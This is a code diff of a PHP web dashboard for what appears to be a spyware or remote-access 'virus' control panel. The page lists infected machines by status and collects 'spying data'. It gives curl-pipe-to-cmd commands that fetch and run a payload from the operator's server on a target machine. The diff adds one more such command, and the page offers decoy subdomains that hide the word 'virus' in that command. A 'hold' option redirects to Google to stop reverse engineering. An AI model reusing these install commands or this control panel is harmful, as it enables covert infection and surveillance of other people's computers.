@@ -12,9 +12,8 @@ use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\formattedTimeSpan;
 use function Kelvinho\Virus\map;
 
-
 /**
- * @param array $datas Array of {"virus_id" -> "{virus_id}", "last_ping" -> "{last ping}", "style" -> "{tr styles}", "displays" -> {"Name" -> "{name}", "Virus id" -> "{virus_id}", "Last seen" -> "{last_seen}"}}
+ * @param array $datas Array of {"virus_id" -> "{virus_id}", "last_ping" -> "{last ping}", "style" -> "{tr style}", "displays" -> {"Name" -> "{name}", "Virus id" -> "{virus_id}", "Last seen" -> "{last_seen}"}}
  * @noinspection PhpUnusedParameterInspection
  */
 function displayTable(array $datas) {
@@ -65,6 +64,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
             padding: 0;
             margin: 0;
         }
+
         .hold {
             color: blue;
             cursor: pointer;
@@ -77,7 +77,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
     than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
 <?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_ACTIVE), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
-    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
+    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
         "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
         "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
@@ -88,7 +88,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
     than 2 days</p>
 <?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
-    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
+    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
         "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
         "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
@@ -98,7 +98,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <p>These are viruses that don't report back for more than 2 days</p>
 <?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_LOST), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
-    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
+    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
         "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
         "Last seen" => "<a $onclick>" . formattedTime($virus->getLastPing() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
@@ -109,7 +109,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
     triggered by accessing the entry point.</p>
 <?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_EXPECTING), function ($data) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
-    $onclick = "onclick=\"window.location = '" . DOMAIN_VIRUS_INFO . "?virus_id=" . $virus->getVirusId() . "';\"";
+    $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
         "Virus id" => "<a $onclick>" . formattedHash($virus->getVirusId()) . "</a>",
         "" => "<a onclick = 'deleteVirus(\"" . $virus->getVirusId() . "\")'>Delete</a>"));
@@ -122,16 +122,19 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
     and foil your plans. So, this is a way to hide that URL, and redirect it to google if you choose to hold it.</p>
 <?php
 if ($user->isHold()) { ?>
-    <p><span style = "color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a class = "hold" onclick="removeHold()">here</a> to
+    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span>. Click <a
+                class="hold" onclick="removeHold()">here</a> to
         remove hold.</p>
 <?php } else { ?>
     <p>You are currently not holding, meaning you can install new viruses but outsiders can reverse engineer the virus.
-        Click <a class = "hold" onclick="applyHold()">here</a> to apply a hold.</p>
+        Click <a class="hold" onclick="applyHold()">here</a> to apply a hold.</p>
 <?php } ?>
 <h2>Installing a new virus</h2>
 To install a new virus on a computer, execute this command in the command prompt running Windows on the target machine:
 <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/win/<?php echo $user_handle; ?> | cmd</pre>
-And run this for mac (in development):
+Alternatively, this for Windows:
+<pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/<?php echo $user_handle; ?> | cmd</pre>
+And run this for Mac (in development):
 <pre class="codes" style="overflow: auto;">curl <?php echo DOMAIN; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
 <p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
     expecting viruses.
@@ -154,6 +157,9 @@ And run this for mac (in development):
 <p>The "-L" option is to go through all the redirects your web server guides and to fetch the final destination. If
     you're lazy and just don't agree that I should have the word virus inside of the install command, you can use
     any of these commands instead:</p>
+<p>Or... You don't agree that I control your spying data so you can rebuild everything. The project is open sourced
+    (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The installation details are
+    way too technical here, but there're plenty of guide on the github page.</p>
 <div style="overflow: auto;">
     <?php foreach ($alternates as $alternate) { ?>
         <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/win/<?php echo $user_handle; ?> | cmd</pre>
@@ -176,6 +182,19 @@ And run this for mac (in development):
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
 <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
 <script type="application/javascript">
+    function virusInfo(virus_id) {
+        $.ajax({
+            url: "<?php echo DOMAIN_CONTROLLER; ?>/setVirusId",
+            type: "POST",
+            data: {
+                virus_id: virus_id
+            },
+            success: function () {
+                window.location = "<?php echo DOMAIN_VIRUS_INFO; ?>";
+            }
+        });
+    }
+
     function deleteVirus(virus_id) {
         $.ajax({
             url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus",
